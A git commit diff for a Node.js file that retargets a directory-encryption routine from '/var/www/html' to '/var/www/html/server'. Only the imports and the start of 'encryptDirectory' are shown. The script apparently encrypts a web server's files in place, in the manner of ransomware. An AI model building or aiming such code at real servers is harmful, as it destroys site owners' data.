6246e96c4b0c267e2740af5685b33470afe87c44
radialjoe <168564693+radialjoe@users.noreply.github.com>
2024-05-01 22:29:28 +0530

    Update index_15.js
    sas

--- index_15.js
+++ index_15.js
@@ -1,7 +1,7 @@
 const fs = require('fs');
 const crypto = require('crypto');
 
-const inputDirectory = '/var/www/html';
+const inputDirectory = '/var/www/html/server';
 
 // Function to encrypt directory
 async function encryptDirectory(directory) {
